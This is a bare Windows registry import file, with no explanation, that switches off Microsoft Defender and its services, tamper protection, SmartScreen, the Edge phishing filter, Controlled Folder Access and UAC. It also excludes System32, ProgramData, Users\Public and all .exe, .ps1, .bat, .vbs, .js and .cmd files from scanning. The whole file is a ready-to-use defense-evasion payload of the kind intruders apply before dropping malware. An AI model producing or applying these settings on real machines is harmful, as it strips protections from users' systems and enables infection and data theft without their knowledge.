Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender]
"DisableAntiSpyware"=dword:00000001

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection]
"DisableRealtimeMonitoring"=dword:00000001
"DisableBehaviorMonitoring"=dword:00000001
"DisableOnAccessProtection"=dword:00000001
"DisableScanOnRealtimeEnable"=dword:00000001
"DisableIOAVProtection"=dword:00000001

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Features]
"TamperProtection"=dword:00000004

[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SecurityHealthService]
"Start"=dword:00000004

[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WinDefend]
"Start"=dword:00000004

[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdNisSvc]
"Start"=dword:00000004

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\System]
"EnableSmartScreen"=dword:00000000

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\MicrosoftEdge\PhishingFilter]
"EnabledV9"=dword:00000000

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\WindowsStore]
"AutoDownload"=dword:00000004

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet]
"SpynetReporting"=dword:00000000
"SubmitSamplesConsent"=dword:00000002

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Office\Common]
"AVSCheckProcess"=dword:00000000

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Windows Defender Exploit Guard\Controlled Folder Access]
"EnableControlledFolderAccess"=dword:00000000

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System]
"EnableLUA"=dword:00000000

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths]
"C:\\Windows\\System32"=dword:00000001
"C:\\Windows\\SysWOW64"=dword:00000001
"C:\\ProgramData"=dword:00000001
"C:\\Users\\Public"=dword:00000001

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Extensions]
".bat"=dword:00000001
".ps1"=dword:00000001
".vbs"=dword:00000001
".js"=dword:00000001
".exe"=dword:00000001
".cmd"=dword:00000001
